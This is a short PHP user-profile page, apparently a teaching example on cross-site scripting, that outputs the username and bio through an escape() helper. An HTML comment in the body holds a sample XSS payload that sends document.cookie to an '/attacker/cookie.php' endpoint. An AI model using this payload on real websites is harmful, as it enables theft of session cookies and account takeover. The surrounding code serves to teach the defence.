<?php

// XSS (Cross-site scripting)

require 'includes/db.inc.php';
require 'includes/functions.inc.php';

$date = new DateTime('+1 week');
setcookie('session', 'abc', $date->getTimestamp());

if (!isset($_GET['username'])) {
    die();
}

$user = $db->prepare('SELECT * FROM user WHERE username = :username');
$user->execute([
    'username' => $_GET['username']
]);

$user = $user->fetchObject();

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>User profile</title>
</head>
<body>
    <h2><?= escape($user->username); ?></h2>
    <!--  <script>document.location = "/attacker/cookie.php?cookie=" + document.cookie</script>  -->
    <p><?= escape($user->bio); ?></p>
</body>
</html>
